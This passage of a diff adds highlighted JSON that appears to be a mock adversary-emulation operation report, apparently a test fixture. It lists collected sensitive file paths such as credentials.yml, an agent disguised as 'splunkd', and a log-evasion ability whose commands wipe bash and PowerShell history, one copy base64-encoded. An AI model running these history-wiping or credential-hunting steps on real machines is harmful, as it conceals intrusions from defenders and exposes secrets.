+<span class="w">      </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.file.path&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;origin_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;LEARNED&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;relationships&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;host.file.path(/Users/foo/bar/PyTorch Models/myModel.pt) : has_extension : file.sensitive.extension(pt)&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;3e8c71c1-dfc8-494f-8262-1378e8620791&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1005&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;trait&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.file.path&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;unique&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.file.path/Users/foo/bar/PyTorch Models/myModel.pt&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/Users/foo/bar/PyTorch Models/myModel.pt&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;collected_by&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;vrgirx&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:09:07Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;limit_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;links&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;ddf2aa96-24a1-4e71-8360-637a821b0781&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.file.path&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;origin_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;LEARNED&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;relationships&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;host.file.path(/Users/foo/bar/credentials.yml) : has_extension : file.sensitive.extension(yml)&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;3e8c71c1-dfc8-494f-8262-1378e8620791&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1005&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;trait&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.file.path&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;unique&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.file.path/Users/foo/bar/credentials.yml&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/Users/foo/bar/credentials.yml&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;collected_by&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;vrgirx&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:10:45Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;limit_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;links&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;fa7ac865-004d-4296-9d68-fd425a481b5e&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.file.path&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;origin_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;LEARNED&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;relationships&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;host.file.path(/Users/foo/bar/sensitive.sql) : has_extension : file.sensitive.extension(sql)&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;3e8c71c1-dfc8-494f-8262-1378e8620791&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1005&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;trait&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.file.path&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;unique&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;host.file.path/Users/foo/bar/sensitive.sql&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/Users/foo/bar/sensitive.sql&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;finish&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:15:04Z&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;host_group&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;architecture&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;amd64&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;available_contacts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;HTTP&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;contact&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HTTP&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;created&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T18:42:02Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;deadman_enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;display_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TARGET-PC$foo&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;exe_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;splunkd&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;executors&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;proc&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="s2">&quot;sh&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;group&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;red&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TARGET-PC&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;host_ip_addrs&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;192.168.1.3&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="s2">&quot;100.64.0.1&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;last_seen&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:39:17Z&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;links&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;43b3754c-def4-4699-a673-1d85648fda6a&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;access&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">            </span><span class="nt">&quot;additional_info&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">            </span><span class="nt">&quot;buckets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">              </span><span class="s2">&quot;defense-evasion&quot;</span>
+<span class="w">            </span><span class="p">],</span>
+<span class="w">            </span><span class="nt">&quot;delete_payload&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Stop terminal from logging history&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;executors&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">              </span><span class="p">{</span>
+<span class="w">                </span><span class="nt">&quot;additional_info&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">                </span><span class="nt">&quot;build_target&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;cleanup&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;code&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&gt; $HOME/.bash_history &amp;&amp; unset HISTFILE&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;language&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;parsers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;payloads&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">60</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;uploads&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;variations&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+<span class="w">              </span><span class="p">},</span>
+<span class="w">              </span><span class="p">{</span>
+<span class="w">                </span><span class="nt">&quot;additional_info&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">                </span><span class="nt">&quot;build_target&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;cleanup&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;code&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&gt; $HOME/.bash_history &amp;&amp; unset HISTFILE&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;language&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;parsers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;payloads&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;linux&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">60</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;uploads&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;variations&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+<span class="w">              </span><span class="p">},</span>
+<span class="w">              </span><span class="p">{</span>
+<span class="w">                </span><span class="nt">&quot;additional_info&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">                </span><span class="nt">&quot;build_target&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;cleanup&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;code&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Clear-History;Clear&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;language&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;psh&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;parsers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;payloads&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;windows&quot;</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">60</span><span class="p">,</span>
+<span class="w">                </span><span class="nt">&quot;uploads&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">                </span><span class="nt">&quot;variations&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+<span class="w">              </span><span class="p">}</span>
+<span class="w">            </span><span class="p">],</span>
+<span class="w">            </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Avoid logs&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;plugin&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;stockpile&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;privilege&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;repeatable&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;requirements&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">            </span><span class="nt">&quot;singleton&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;defense-evasion&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1070.003&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Indicator Removal on Host: Clear Command History&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T18:42:02Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;cleanup&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;collect&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T18:42:02Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;deadman&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;decide&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T18:42:02Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;additional_info&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">            </span><span class="nt">&quot;build_target&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;cleanup&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">            </span><span class="nt">&quot;code&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&gt; $HOME/.bash_history &amp;&amp; unset HISTFILE&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;language&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;parsers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">            </span><span class="nt">&quot;payloads&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">            </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">60</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;uploads&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">            </span><span class="nt">&quot;variations&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;facts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">          </span><span class="nt">&quot;finish&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T18:42:02Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TARGET-PC&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;be6db169-f88d-46f5-8375-ace0e0b2a0df&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;jitter&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;output&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;stdout&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;False&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;stderr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;exit_code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;paw&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;vrgirx&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;14441&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;pin&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;relationships&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">          </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;unique&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;be6db169-f88d-46f5-8375-ace0e0b2a0df&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;used&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">          </span><span class="nt">&quot;visibility&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;adjustments&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">            </span><span class="nt">&quot;score&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">50</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;location&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/Users/foo/splunkd&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;origin_link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;paw&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;vrgirx&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;pending_contact&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HTTP&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">32746</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;ppid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">32662</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;privilege&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;User&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;proxy_chain&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">      </span><span class="nt">&quot;proxy_receivers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">      </span><span class="nt">&quot;server&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;http://0.0.0.0:8888&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;sleep_max&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">60</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;sleep_min&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;trusted&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;upstream_dest&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;http://0.0.0.0:8888&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;foo&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;watchdog&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;jitter&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2/8&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mock_operation_report&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;objectives&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;This is a default objective that runs forever.&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;goals&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">      </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;achieved&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1048576</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;operator&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;==&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;target&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;exhaustion&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;complete&quot;</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">    </span><span class="p">],</span>
+<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;495a9828-cab1-44dd-a0ca-66e58177d8cc&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;default&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;percentage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;planner&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;atomic&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;skipped_abilities&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;vrgirx&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;start&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:07:07Z&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;steps&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;vrgirx&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;steps&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;6469befa-748a-4b9c-a96d-f191fde47d89&quot;</span><span class="p">,</span>
